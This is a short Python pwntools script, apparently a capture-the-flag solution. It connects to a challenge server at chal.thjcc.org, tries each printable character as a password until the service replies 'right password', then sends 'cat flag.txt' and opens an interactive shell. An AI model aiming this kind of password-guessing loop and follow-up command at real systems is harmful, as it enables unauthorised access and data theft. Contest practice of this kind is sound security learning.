import string
from pwn import *

CHARSET = (string.digits + string.ascii_uppercase + string.ascii_lowercase
           + "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")

io = remote('chal.thjcc.org', 11039)

for c in CHARSET:
    io.recvuntil(b'please input your password:\n')
    io.sendline(c.encode())
    if b'right password' in io.recvline():
        log.success(f'password[0] = {c!r}')
        break

io.sendline(b'cat flag.txt')
io.interactive()
